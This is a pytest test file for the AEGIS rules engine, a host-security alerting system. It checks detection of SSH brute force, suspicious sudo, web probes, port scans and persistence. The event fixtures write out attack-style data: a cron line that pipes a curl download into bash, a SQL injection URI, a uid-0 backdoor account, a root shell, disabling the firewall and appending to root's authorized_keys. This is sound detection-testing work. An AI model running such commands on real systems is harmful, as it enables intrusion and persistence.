"""
Unit Tests for AEGIS Deterministic Rules Engine (aegis_backend.rules_engine).
Validates:
1. Negative Cases: Zero alert fabrication on normal and sub-threshold events.
2. Positive Cases:
   - RULE-SSH-BRUTE (>= 3 failures in 5 min, High severity).
   - RULE-AUTH-003 (failed login followed by success within 10 min, High severity).
   - RULE-SUSP-SUDO (shell escape -> High, risky perm -> Medium, 3x auth fail -> High).
3. Anti-Pollution: Distinct source IPs are never merged into a false brute-force cluster.
4. Idempotency: Duplicate event evaluation yields stable alert fingerprints.
5. Out-of-order Resilience: Event ordering does not affect sliding window accuracy.
"""

import pytest
from datetime import datetime, timezone, timedelta
from aegis_backend.rules_engine import RulesEngine


@pytest.fixture
def engine():
    return RulesEngine(
        ssh_brute_threshold=3,
        ssh_brute_window_sec=300,
        auth_success_window_sec=600,
        sudo_auth_threshold=3,
        sudo_auth_window_sec=300,
    )


# =====================================================================
# 1. SSH BRUTE-FORCE TESTS (RULE-SSH-BRUTE)
# =====================================================================

def test_single_ssh_failure_no_alert(engine):
    events = [
        {
            "id": "EVT-01",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": "2026-11-07T10:00:00Z",
            "source_ip": "198.51.100.10",
            "user_name": "ubuntu",
        }
    ]
    alerts, evidence = engine.evaluate_events(events)
    assert len(alerts) == 0
    assert len(evidence) == 0


def test_ssh_brute_force_above_threshold_triggers_high_alert(engine):
    base_time = datetime(2026, 11, 7, 10, 0, 0, tzinfo=timezone.utc)
    events = [
        {
            "id": f"EVT-FAIL-{i}",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=i * 20)).isoformat(),
            "source_ip": "198.51.100.10",
            "user_name": "root",
        }
        for i in range(4)  # 4 failures in 60s (threshold is >= 3 in 300s)
    ]

    alerts, evidence = engine.evaluate_events(events)
    assert len(alerts) == 1
    alert = alerts[0]
    assert alert["rule_id"] == "RULE-SSH-BRUTE"
    assert alert["severity"] == "high"
    assert alert["host_id"] == "host-fenn"
    assert "198.51.100.10" in alert["reason"]
    # Evidence must link all events in window
    assert len(evidence) >= 3
    trigger_roles = [e["citation_role"] for e in evidence if e["alert_id"] == alert["id"]]
    assert "trigger" in trigger_roles
    assert "supporting" in trigger_roles


def test_ssh_failures_from_distinct_ips_not_conflated(engine):
    """
    2 failures from IP A and 2 failures from IP B must NOT combine into 4
    to trigger an IP brute-force alert.
    """
    base_time = datetime(2026, 11, 7, 10, 0, 0, tzinfo=timezone.utc)
    events = [
        # IP A (2 fails)
        {
            "id": "EVT-A-1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=10)).isoformat(),
            "source_ip": "198.51.100.1",
            "user_name": "user1",
        },
        {
            "id": "EVT-A-2",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=20)).isoformat(),
            "source_ip": "198.51.100.1",
            "user_name": "user2",
        },
        # IP B (2 fails)
        {
            "id": "EVT-B-1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=30)).isoformat(),
            "source_ip": "198.51.100.2",
            "user_name": "user3",
        },
        {
            "id": "EVT-B-2",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=40)).isoformat(),
            "source_ip": "198.51.100.2",
            "user_name": "user4",
        },
    ]

    alerts, evidence = engine.evaluate_events(events)
    # Neither IP nor username reached threshold of 3
    assert len(alerts) == 0


def test_cross_host_isolation_never_conflates_failures(engine):
    """
    2 failures on Host 1 and 2 failures on Host 2 from the same attacker IP
    must NEVER trigger a brute-force alert because each host is strictly isolated.
    """
    base_time = datetime(2026, 11, 7, 10, 0, 0, tzinfo=timezone.utc)
    events = [
        # Host A (2 fails)
        {
            "id": "EVT-HOST1-1",
            "host_id": "srv-prod-01",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=10)).isoformat(),
            "source_ip": "198.51.100.99",
            "user_name": "root",
        },
        {
            "id": "EVT-HOST1-2",
            "host_id": "srv-prod-01",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=20)).isoformat(),
            "source_ip": "198.51.100.99",
            "user_name": "root",
        },
        # Host B (2 fails)
        {
            "id": "EVT-HOST2-1",
            "host_id": "srv-prod-02",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=30)).isoformat(),
            "source_ip": "198.51.100.99",
            "user_name": "root",
        },
        {
            "id": "EVT-HOST2-2",
            "host_id": "srv-prod-02",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=40)).isoformat(),
            "source_ip": "198.51.100.99",
            "user_name": "root",
        },
    ]

    alerts, evidence = engine.evaluate_events(events)
    # Neither host has 3 failures -> 0 alerts
    assert len(alerts) == 0
    assert len(evidence) == 0



# =====================================================================
# 2. FAILED LOGIN FOLLOWED BY SUCCESS (RULE-AUTH-003)
# =====================================================================

def test_failed_login_followed_by_success_triggers_high_alert(engine):
    base_time = datetime(2026, 11, 7, 10, 0, 0, tzinfo=timezone.utc)
    events = [
        {
            "id": "EVT-F1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=10)).isoformat(),
            "source_ip": "198.51.100.25",
            "user_name": "admin",
        },
        {
            "id": "EVT-S1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_success",
            "event_timestamp": (base_time + timedelta(seconds=90)).isoformat(),
            "source_ip": "198.51.100.25",
            "user_name": "admin",
        },
    ]

    alerts, evidence = engine.evaluate_events(events)
    assert len(alerts) == 1
    alert = alerts[0]
    assert alert["rule_id"] == "RULE-AUTH-003"
    assert alert["severity"] == "high"
    assert alert["host_id"] == "host-fenn"

    # Evidence checks: S1 is trigger, F1 is supporting
    roles = {e["event_id"]: e["citation_role"] for e in evidence if e["alert_id"] == alert["id"]}
    assert roles["EVT-S1"] == "trigger"
    assert roles["EVT-F1"] == "supporting"


def test_auth_success_without_identity_does_not_correlate(engine):
    base_time = datetime(2026, 11, 7, 10, 0, 0, tzinfo=timezone.utc)
    events = [
        {
            "id": "EVT-F1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=10)).isoformat(),
            "source_ip": None,
            "user_name": None,
        },
        {
            "id": "EVT-S1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_success",
            "event_timestamp": (base_time + timedelta(seconds=90)).isoformat(),
            "source_ip": None,
            "user_name": None,
        },
    ]

    alerts, evidence = engine.evaluate_events(events)
    assert len(alerts) == 0


# =====================================================================
# 3. SUSPICIOUS SUDO TESTS (RULE-SUSP-SUDO)
# =====================================================================

def test_normal_sudo_command_produces_no_alert(engine):
    events = [
        {
            "id": "EVT-SUDO-01",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "sudo_execution",
            "event_timestamp": "2026-11-07T10:00:00Z",
            "user_name": "ubuntu",
            "details": {
                "command": "/usr/bin/systemctl status aegis-collector",
                "target_user": "root",
            },
        },
        {
            "id": "EVT-SUDO-02",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "sudo_execution",
            "event_timestamp": "2026-11-07T10:01:00Z",
            "user_name": "ubuntu",
            "details": {
                "command": "/bin/cat /var/log/syslog",
                "target_user": "root",
            },
        },
    ]
    alerts, evidence = engine.evaluate_events(events)
    assert len(alerts) == 0


def test_sudo_root_shell_triggers_high_alert(engine):
    events = [
        {
            "id": "EVT-SUDO-SHELL",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "sudo_execution",
            "event_timestamp": "2026-11-07T10:00:00Z",
            "user_name": "ubuntu",
            "details": {
                "command": "/bin/bash",
                "target_user": "root",
            },
        }
    ]
    alerts, evidence = engine.evaluate_events(events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-SUSP-SUDO"
    assert alerts[0]["severity"] == "high"
    assert "interactive shell" in alerts[0]["reason"].lower()
    assert len(evidence) == 1
    assert evidence[0]["citation_role"] == "trigger"


def test_sudo_risky_chmod_777_triggers_medium_alert(engine):
    events = [
        {
            "id": "EVT-SUDO-CHMOD",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "sudo_execution",
            "event_timestamp": "2026-11-07T10:00:00Z",
            "user_name": "ubuntu",
            "details": {
                "command": "chmod 777 /var/www/html",
                "target_user": "root",
            },
        }
    ]
    alerts, evidence = engine.evaluate_events(events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-SUSP-SUDO"
    assert alerts[0]["severity"] == "medium"
    assert "permissive" in alerts[0]["reason"].lower()


def test_repeated_sudo_auth_failures_triggers_high_alert(engine):
    base_time = datetime(2026, 11, 7, 10, 0, 0, tzinfo=timezone.utc)
    events = [
        {
            "id": f"EVT-SUDO-FAIL-{i}",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "sudo_auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=i * 15)).isoformat(),
            "user_name": "ubuntu",
            "details": {"reason": "authentication_failure"},
        }
        for i in range(3)
    ]
    alerts, evidence = engine.evaluate_events(events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-SUSP-SUDO"
    assert alerts[0]["severity"] == "high"
    assert "consecutive sudo password" in alerts[0]["reason"]


# =====================================================================
# 4. RESILIENCE, IDEMPOTENCY & OUT-OF-ORDER TESTS
# =====================================================================

def test_alert_generation_is_idempotent(engine):
    base_time = datetime(2026, 11, 7, 10, 0, 0, tzinfo=timezone.utc)
    events = [
        {
            "id": f"EVT-FAIL-{i}",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=i * 20)).isoformat(),
            "source_ip": "198.51.100.10",
            "user_name": "root",
        }
        for i in range(3)
    ]

    alerts1, ev1 = engine.evaluate_events(events)
    alerts2, ev2 = engine.evaluate_events(events)

    assert len(alerts1) == len(alerts2) == 1
    assert alerts1[0]["id"] == alerts2[0]["id"]
    assert len(ev1) == len(ev2)


def test_out_of_order_events_handled_correctly(engine):
    base_time = datetime(2026, 11, 7, 10, 0, 0, tzinfo=timezone.utc)
    # Delivered in REVERSE order
    events_reversed = [
        {
            "id": "EVT-S1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_success",
            "event_timestamp": (base_time + timedelta(seconds=90)).isoformat(),
            "source_ip": "198.51.100.25",
            "user_name": "admin",
        },
        {
            "id": "EVT-F1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "auth_failure",
            "event_timestamp": (base_time + timedelta(seconds=10)).isoformat(),
            "source_ip": "198.51.100.25",
            "user_name": "admin",
        },
    ]

    alerts, evidence = engine.evaluate_events(events_reversed)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-AUTH-003"


# =====================================================================
# 5. MULTI-SOURCE DETECTION RULES (WEB, ACCOUNT, FIREWALL, CRON, TAMPER)
# =====================================================================

def test_web_attack_probe_and_account_backdoor_rules(engine):
    events = [
        {
            "id": "EVT-WEB-1",
            "host_id": "host-fenn",
            "source_id": "nginx-access",
            "event_type": "web_attack_probe",
            "event_timestamp": "2026-11-07T11:00:00Z",
            "source_ip": "198.51.100.88",
            "user_name": None,
            "details": {
                "attack_category": "sql_injection",
                "uri": "/login?user=admin%27%20UNION%20SELECT%201--",
                "status_code": 500,
            },
        },
        {
            "id": "EVT-ACCT-1",
            "host_id": "host-fenn",
            "source_id": "ssh-auth",
            "event_type": "account_created",
            "event_timestamp": "2026-11-07T11:01:00Z",
            "source_ip": None,
            "user_name": "sysbackup",
            "details": {"uid": "0", "gid": "0"},
        },
    ]
    alerts, evidence = engine.evaluate_events(events)
    rule_ids = {a["rule_id"]: a for a in alerts}
    assert "RULE-WEB-ATTACK" in rule_ids
    assert rule_ids["RULE-WEB-ATTACK"]["severity"] == "critical"
    assert "RULE-ACCT-BACKDOOR" in rule_ids
    assert rule_ids["RULE-ACCT-BACKDOOR"]["severity"] == "critical"


def test_firewall_portscan_and_kernel_segfault_rules(engine):
    base_time = datetime(2026, 11, 7, 11, 10, 0, tzinfo=timezone.utc)
    events = [
        {
            "id": f"EVT-UFW-{i}",
            "host_id": "host-fenn",
            "source_id": "systemd",
            "event_type": "firewall_block",
            "event_timestamp": (base_time + timedelta(seconds=i * 5)).isoformat(),
            "source_ip": "203.0.113.55",
            "user_name": None,
            "details": {"dest_port": 3300 + i, "protocol": "TCP"},
        }
        for i in range(4)
    ] + [
        {
            "id": "EVT-KRN-1",
            "host_id": "host-fenn",
            "source_id": "systemd",
            "event_type": "kernel_segfault",
            "event_timestamp": (base_time + timedelta(seconds=30)).isoformat(),
            "source_ip": None,
            "user_name": None,
            "details": {"process_name": "apache2", "library": "libc.so.6"},
        }
    ]
    alerts, _ = engine.evaluate_events(events)
    rule_ids = {a["rule_id"] for a in alerts}
    assert "RULE-FW-PORTSCAN" in rule_ids
    assert "RULE-KERNEL-EXPLOIT" in rule_ids


def test_cron_persistence_defense_evasion_and_key_tamper_rules(engine):
    events = [
        {
            "id": "EVT-CRON-1",
            "host_id": "host-fenn",
            "source_id": "systemd",
            "event_type": "cron_execution",
            "event_timestamp": "2026-11-07T11:20:00Z",
            "source_ip": None,
            "user_name": "root",
            "details": {"command": "curl -s http://198.51.100.99/p.sh | bash"},
        },
        {
            "id": "EVT-SVC-1",
            "host_id": "host-fenn",
            "source_id": "systemd",
            "event_type": "service_stopped",
            "event_timestamp": "2026-11-07T11:21:00Z",
            "source_ip": None,
            "user_name": None,
            "details": {"unit": "ufw.service"},
        },
        {
            "id": "EVT-KEY-1",
            "host_id": "host-fenn",
            "source_id": "auditd",
            "event_type": "critical_file_modified",
            "event_timestamp": "2026-11-07T11:22:00Z",
            "source_ip": None,
            "user_name": "ubuntu",
            "details": {"target_file": "/root/.ssh/authorized_keys", "command": "tee -a /root/.ssh/authorized_keys"},
        },
    ]
    alerts, _ = engine.evaluate_events(events)
    rule_ids = {a["rule_id"]: a["severity"] for a in alerts}
    assert rule_ids.get("RULE-CRON-PERSIST") == "high"
    assert rule_ids.get("RULE-DEFENSE-EVASION") == "critical"
    assert rule_ids.get("RULE-SSH-KEY-BACKDOOR") == "critical"


